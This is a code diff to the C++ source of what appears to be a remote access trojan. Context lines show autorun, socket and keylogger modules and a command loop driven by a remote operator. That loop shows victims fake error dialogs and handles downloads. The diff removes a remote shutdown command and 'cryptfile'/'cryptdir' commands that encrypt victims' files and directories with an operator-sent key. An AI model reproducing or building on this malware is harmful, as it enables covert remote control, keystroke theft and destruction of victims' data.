@@ -14,7 +14,6 @@
 
 #include "Autorun.h"
 #include "Socket.h"
-#include "Crypt.h"
 #include "Utils.h"
 #include "Info.h"
 #include "Keylogger.h"
@@ -25,6 +24,8 @@
 
 std::string buf, rbuf, key_ret, keydel, rkeydel, buf_file, loc_buf_file, keylog_path, chars, finally_msg, n_path;
 std::string key_log_dump;
+
+
 bool close = false;
 
 int Shell(SOCKADDR_IN addr);
@@ -174,31 +175,10 @@ int Shell(SOCKADDR_IN addr) {
 
 		}
 
-		else if (!strcmp(buffer, "shutdown")) {
-			system("shutdown /p");
-		}
 
 		else if (!strcmp(buffer, "error")) {
 			recv(conn, path, sizeof(path), NULL);
 			MessageBoxA(NULL, path, "error 0x648396234", MB_ICONERROR | MB_OK | MB_SETFOREGROUND);
-		}
-
-		else if (!strcmp(buffer, "cryptfile")) {
-			char key[128];
-			memset(&key, 0x0, sizeof(key));
-			recv(conn, path, sizeof(path), NULL);
-			recv(conn, key, sizeof(key), NULL);
-			std::string res = CryptFile(path, atoi(key));
-			send(conn, res.c_str(), res.length(), NULL);
-		}
-
-		else if (!strcmp(buffer, "cryptdir")) {
-			char key[128];
-			memset(&key, 0x0, sizeof(key));
-			recv(conn, path, sizeof(path), NULL);
-			recv(conn, key, sizeof(key), NULL);
-			std::string res = CryptDir(path, atoi(key));
-			send(conn, res.c_str(), res.length(), NULL);
 		}
 
 		else if (!strcmp(buffer, "download")) {
